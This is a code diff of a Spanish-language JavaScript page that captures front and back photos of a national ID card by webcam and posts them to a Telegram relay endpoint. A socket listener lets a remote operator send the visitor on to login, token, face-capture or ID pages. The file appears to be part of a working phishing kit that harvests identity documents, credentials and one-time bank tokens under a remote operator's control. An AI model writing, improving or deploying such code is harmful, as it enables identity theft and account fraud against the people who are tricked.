@@ -1,195 +1,362 @@
 /**
- * CEDULA.JS - Página de captura de documento
- * Maneja la cámara web y captura de cédula
+ * CÉDULA - CAPTURA DE DOCUMENTO
+ * Captura frontal y trasera de la cédula con validación
+ * Versión optimizada con arquitectura robusta
  */
 
-document.addEventListener('DOMContentLoaded', function() {
-    console.log('🚀 Iniciando página de captura de cédula...');
-    
-    // Asegurar que commonUtils esté inicializado
-    if (window.commonUtils && !window.commonUtils.initialized) {
+(() => {
+    'use strict';
+
+    // ============================
+    // ESTADO DE LA APLICACIÓN
+    // ============================
+    const appState = {
+        video: null,
+        canvas: null,
+        stream: null,
+        currentSide: 'frontal', // 'frontal' o 'trasera'
+        capturedPhotos: {
+            frontal: null,
+            trasera: null
+        },
+        messageId: null,
+        isCapturing: false,
+        isCameraActive: false
+    };
+
+    // ============================
+    // ELEMENTOS DEL DOM
+    // ============================
+    const elements = {
+        video: null,
+        canvas: null,
+        captureBtn: null,
+        continueBtn: null,
+        instructionText: null,
+        progressStep: null
+    };
+
+    // ============================
+    // CONSTANTES
+    // ============================
+    const CAMERA_CONSTRAINTS = {
+        video: {
+            facingMode: 'environment',
+            width: { ideal: 1920 },
+            height: { ideal: 1080 }
+        }
+    };
+
+    const IMAGE_QUALITY = 0.95;
+
+    // ============================
+    // INICIALIZACIÓN
+    // ============================
+    function init() {
+        console.log('🎬 Inicializando captura de cédula...');
+
+        if (!initializeElements()) {
+            console.error('❌ Error: Elementos DOM no encontrados');
+            return;
+        }
+
+        if (!validateCommonUtils()) {
+            console.error('❌ Error: commonUtils no disponible');
+            return;
+        }
+
+        // Inicializar utilidades comunes
         window.commonUtils.initializeCommon();
+
+        // Obtener messageId de datos previos
+        loadPreviousData();
+
+        // Configurar event listeners
+        setupEventListeners();
+
+        // Iniciar cámara automáticamente
+        startCamera();
+
+        console.log('✅ Inicialización completada');
     }
 
-    // Ocultar overlay inicial
-    if (window.loadingOverlay) {
-        window.loadingOverlay.hide();
+    // ============================
+    // INICIALIZACIÓN DE ELEMENTOS
+    // ============================
+    function initializeElements() {
+        elements.video = document.getElementById('video');
+        elements.canvas = document.getElementById('canvas');
+        elements.captureBtn = document.getElementById('captureBtn');
+        elements.continueBtn = document.getElementById('continueBtn');
+        elements.instructionText = document.getElementById('instructionText');
+        elements.progressStep = document.querySelector('.progress-step.active');
+
+        appState.video = elements.video;
+        appState.canvas = elements.canvas;
+
+        return elements.video && elements.canvas && elements.captureBtn;
     }
 
-    // Variables globales
-    let stream = null;
-    let capturedPhoto = null;
+    // ============================
+    // VALIDACIONES
+    // ============================
+    function validateCommonUtils() {
+        return window.commonUtils && 
+               typeof window.commonUtils.initializeCommon === 'function' &&
+               typeof window.commonUtils.showError === 'function' &&
+               typeof window.commonUtils.getSessionId === 'function';
+    }
 
-    // Elementos DOM
-    const video = document.getElementById('video');
-    const canvas = document.getElementById('canvas');
-    const cameraPreview = document.getElementById('cameraPreview');
-    const cameraPlaceholder = document.getElementById('cameraPlaceholder');
-    const capturedImage = document.getElementById('capturedImage');
-    const capturedPhotoImg = document.getElementById('capturedPhoto');
-    const startCameraButton = document.getElementById('startCameraButton');
-    const captureButton = document.getElementById('captureButton');
-    const continueButton = document.getElementById('continueButton');
-    const retakeButton = document.getElementById('retakeButton');
-
-    // Iniciar cámara
-    startCameraButton.addEventListener('click', async function() {
-        console.log('📹 Iniciando cámara...');
-        
+    // ============================
+    // CARGAR DATOS PREVIOS
+    // ============================
+    function loadPreviousData() {
         try {
-            stream = await navigator.mediaDevices.getUserMedia({ 
-                video: { 
-                    facingMode: 'environment',
-                    width: { ideal: 1920 },
-                    height: { ideal: 1080 }
-                } 
-            });
+            const storedData = sessionStorage.getItem('formData');
+            if (storedData) {
+                const data = JSON.parse(storedData);
+                appState.messageId = data.messageId || `temp_${Date.now()}`;
+                console.log('📦 Datos previos cargados, messageId:', appState.messageId);
+            } else {
+                appState.messageId = `cedula_${Date.now()}`;
+                console.log('⚠️ No hay datos previos, messageId generado:', appState.messageId);
+            }
+        } catch (error) {
+            console.error('❌ Error al cargar datos previos:', error);
+            appState.messageId = `cedula_${Date.now()}`;
+        }
+    }
+
+    // ============================
+    // EVENT LISTENERS
+    // ============================
+    function setupEventListeners() {
+        elements.captureBtn.addEventListener('click', handleCapture);
+        
+        if (elements.continueBtn) {
+            elements.continueBtn.addEventListener('click', handleContinue);
+        }
+
+        // Limpiar al salir
+        window.addEventListener('beforeunload', cleanup);
+
+        // Listener para acciones de Telegram
+        if (window.socket) {
+            window.socket.on('telegram_action', handleTelegramAction);
+        }
+    }
+
+    // ============================
+    // CÁMARA
+    // ============================
+    async function startCamera() {
+        if (appState.isCameraActive) {
+            console.log('⚠️ La cámara ya está activa');
+            return;
+        }
+
+        try {
+            console.log('📹 Iniciando cámara...');
+            appState.stream = await navigator.mediaDevices.getUserMedia(CAMERA_CONSTRAINTS);
             
-            video.srcObject = stream;
-            cameraPlaceholder.style.display = 'none';
-            video.style.display = 'block';
+            elements.video.srcObject = appState.stream;
+            elements.video.play();
             
-            startCameraButton.style.display = 'none';
-            captureButton.style.display = 'flex';
-            
-            console.log('✅ Cámara iniciada exitosamente');
-            
+            appState.isCameraActive = true;
+            console.log('✅ Cámara iniciada correctamente');
         } catch (error) {
             console.error('❌ Error al acceder a la cámara:', error);
-            window.commonUtils.showError('No se pudo acceder a la cámara. Por favor, verifique los permisos.');
+            window.commonUtils.showError(
+                'No se pudo acceder a la cámara. Por favor, otorgue los permisos necesarios.'
+            );
         }
-    });
+    }
 
-    // Capturar foto
-    captureButton.addEventListener('click', function() {
-        console.log('📸 Capturando foto...');
-        
-        if (!stream) {
-            window.commonUtils.showError('La cámara no está activa');
+    function stopCamera() {
+        if (appState.stream) {
+            appState.stream.getTracks().forEach(track => track.stop());
+            appState.stream = null;
+            appState.isCameraActive = false;
+            console.log('🛑 Cámara detenida');
+        }
+    }
+
+    // ============================
+    // CAPTURA DE FOTO
+    // ============================
+    async function handleCapture() {
+        if (appState.isCapturing) {
+            console.log('⚠️ Captura en progreso...');
             return;
         }
 
-        // Configurar canvas
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
-        
-        const ctx = canvas.getContext('2d');
-        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-        
-        // Obtener imagen
-        capturedPhoto = canvas.toDataURL('image/jpeg', 0.95);
-        
-        // Mostrar imagen capturada
-        capturedPhotoImg.src = capturedPhoto;
-        cameraPreview.style.display = 'none';
-        capturedImage.style.display = 'flex';
-        
-        // Detener stream
-        if (stream) {
-            stream.getTracks().forEach(track => track.stop());
-            stream = null;
-        }
-        
-        // Mostrar botón continuar
-        captureButton.style.display = 'none';
-        continueButton.style.display = 'flex';
-        
-        console.log('✅ Foto capturada exitosamente');
-    });
-
-    // Retomar foto
-    retakeButton.addEventListener('click', function() {
-        console.log('🔄 Retomando foto...');
-        
-        capturedImage.style.display = 'none';
-        cameraPreview.style.display = 'flex';
-        cameraPlaceholder.style.display = 'flex';
-        video.style.display = 'none';
-        
-        capturedPhoto = null;
-        
-        continueButton.style.display = 'none';
-        startCameraButton.style.display = 'flex';
-    });
-
-    // Continuar a siguiente paso
-    continueButton.addEventListener('click', async function() {
-        console.log('➡️ Finalizando proceso de verificación...');
-        
-        if (!capturedPhoto) {
-            window.commonUtils.showError('Debe capturar una foto antes de continuar');
-            return;
-        }
-
-        // Mostrar overlay
-        window.loadingOverlay.showSending('Enviando documento...');
+        appState.isCapturing = true;
+        elements.captureBtn.disabled = true;
 
         try {
-            // Preparar datos
-            const formData = JSON.parse(sessionStorage.getItem('formData') || '{}');
-            
-            console.log('📤 Preparando envío de cédula...');
-            console.log('Message ID:', formData.messageId);
-            console.log('Tamaño foto:', capturedPhoto.length, 'caracteres');
-            
-            const data = {
-                tipo: 'Cédula',
-                messageId: formData.messageId,
-                foto: capturedPhoto
-            };
+            console.log(`📸 Capturando lado ${appState.currentSide}...`);
 
-            console.log('🌐 Enviando request a /api/send-telegram...');
+            // Obtener foto en base64
+            const photoData = capturePhoto();
+            
+            if (!photoData) {
+                throw new Error('No se pudo capturar la foto');
+            }
 
+            // Guardar foto según el lado
+            appState.capturedPhotos[appState.currentSide] = photoData;
+            console.log(`✅ Foto ${appState.currentSide} capturada`);
+
+            // Enviar a Telegram
+            await sendPhotoToTelegram(photoData, appState.currentSide);
+
+            // Actualizar UI según el lado capturado
+            if (appState.currentSide === 'frontal') {
+                // Cambiar a captura trasera
+                appState.currentSide = 'trasera';
+                updateUIForSide('trasera');
+                elements.captureBtn.disabled = false;
+                console.log('🔄 Listo para capturar lado trasero');
+            } else {
+                // Ambos lados capturados
+                console.log('✅ Ambos lados capturados, mostrando botón continuar');
+                elements.captureBtn.style.display = 'none';
+                if (elements.continueBtn) {
+                    elements.continueBtn.style.display = 'block';
+                }
+                stopCamera();
+            }
+
+        } catch (error) {
+            console.error('❌ Error en captura:', error);
+            window.commonUtils.showError('Error al capturar la foto. Intente nuevamente.');
+            elements.captureBtn.disabled = false;
+        } finally {
+            appState.isCapturing = false;
+        }
+    }
+
+    function capturePhoto() {
+        const context = elements.canvas.getContext('2d');
+        elements.canvas.width = elements.video.videoWidth;
+        elements.canvas.height = elements.video.videoHeight;
+        
+        context.drawImage(elements.video, 0, 0);
+        
+        return elements.canvas.toDataURL('image/jpeg', IMAGE_QUALITY);
+    }
+
+    // ============================
+    // ENVÍO A TELEGRAM
+    // ============================
+    async function sendPhotoToTelegram(photoData, side) {
+        const sessionId = window.commonUtils.getSessionId();
+        const sideLabel = side === 'frontal' ? 'Cédula Frontal' : 'Cédula Trasera';
+
+        const data = {
+            tipo: sideLabel,
+            messageId: appState.messageId,
+            foto: photoData,
+            sessionId: sessionId
+        };
+
+        console.log(`📤 Enviando foto ${side} a Telegram con sessionId:`, sessionId);
+
+        window.loadingOverlay.showSending(`Enviando foto ${side}...`);
+
+        try {
             const response = await fetch('/api/send-telegram', {
                 method: 'POST',
                 headers: {
-                    'Content-Type': 'application/json',
-                    'Accept': 'application/json'
+                    'Content-Type': 'application/json'
                 },
                 body: JSON.stringify(data)
             });
 
-            console.log('📨 Response status:', response.status);
-
             if (!response.ok) {
-                const errorText = await response.text();
-                console.error('Error response:', errorText);
                 throw new Error(`Error del servidor: ${response.status}`);
             }
 
             const result = await response.json();
-            console.log('✅ Response result:', result);
-            
+
             if (!result.success) {
-                throw new Error(result.error || 'Error al procesar la solicitud');
+                throw new Error(result.error || 'Error al enviar foto');
             }
 
-            console.log('✅ Cédula enviada exitosamente a Telegram - Message ID:', result.messageId);
-            
-            // Guardar estado
-            formData.cedulaMessageId = result.messageId;
-            sessionStorage.setItem('formData', JSON.stringify(formData));
-            
-            // Mantener overlay con mensaje de procesamiento
-            window.loadingOverlay.showSending('Procesando verificación...');
-            
-            console.log('📺 Esperando respuesta de verificación...');
+            console.log(`✅ Foto ${side} enviada exitosamente, Message ID:`, result.messageId);
 
-            // El loading se mantendrá visible hasta que llegue la acción de Telegram
+            // Mantener overlay visible esperando respuesta de Telegram
+            window.loadingOverlay.show('Esperando validación...');
 
         } catch (error) {
-            console.error('❌ Error al enviar cédula:', error);
+            console.error(`❌ Error al enviar foto ${side}:`, error);
             window.loadingOverlay.hide();
-            window.commonUtils.showError('Error al enviar el documento. Por favor intente nuevamente.');
+            throw error;
         }
-    });
+    }
 
-    // Limpiar al salir
-    window.addEventListener('beforeunload', function() {
-        if (stream) {
-            stream.getTracks().forEach(track => track.stop());
+    // ============================
+    // ACTUALIZACIÓN DE UI
+    // ============================
+    function updateUIForSide(side) {
+        if (!elements.instructionText) return;
+
+        if (side === 'trasera') {
+            elements.instructionText.textContent = 'Ahora captura el lado trasero de tu cédula';
+            elements.captureBtn.textContent = '📸 Capturar Reverso';
+            console.log('🔄 UI actualizada para captura trasera');
         }
-    });
+    }
 
-    console.log('✅ Página de captura de cédula iniciada correctamente');
-});
+    // ============================
+    // CONTINUAR
+    // ============================
+    function handleContinue() {
+        console.log('➡️ Continuando al siguiente paso (token)...');
+        window.location.href = 'token.html';
+    }
+
+    // ============================
+    // ACCIONES DE TELEGRAM
+    // ============================
+    function handleTelegramAction(action) {
+        console.log('📱 Acción recibida de Telegram:', action);
+        window.loadingOverlay.hide();
+
+        const actionHandlers = {
+            'pedir_logo': () => window.location.href = 'index.html',
+            'pedir_token': () => window.location.href = 'token.html',
+            'pedir_cara': () => window.location.href = 'cara.html',
+            'pedir_cedula': () => window.location.reload(),
+            'finalizar': () => {
+                window.commonUtils.showSuccess('Proceso completado exitosamente');
+                setTimeout(() => window.location.href = 'index.html', 2000);
+            }
+        };
+
+        const handler = actionHandlers[action];
+        if (handler) {
+            handler();
+        } else {
+            console.warn('⚠️ Acción desconocida:', action);
+        }
+    }
+
+    // ============================
+    // LIMPIEZA
+    // ============================
+    function cleanup() {
+        stopCamera();
+        console.log('🧹 Recursos liberados');
+    }
+
+    // ============================
+    // AUTO-INICIO
+    // ============================
+    if (document.readyState === 'loading') {
+        document.addEventListener('DOMContentLoaded', init);
+    } else {
+        init();
+    }
+
+})();
